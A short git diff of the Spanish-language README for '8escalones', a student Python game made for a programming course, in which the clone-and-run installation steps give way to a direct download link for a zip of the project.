@@ -7,9 +7,8 @@ Un juego interactivo desarrollado para el Trabajo Práctico Final de Programaci�
 ## Tecnologías utilizadas
 - Python
 
-## Instalación
-1. Clona el repositorio: `git clone https://github.com/tu-usuario/8escalones.git`
-2. Ejecuta el juego: `python main.py`
+##DESCARGAR
+https://github.com/chella16/8escalones/download/v1.0/8escalones.zip
 
 ## Capturas de pantalla
 | Captura 1 | Captura 2 | Captura 3 |
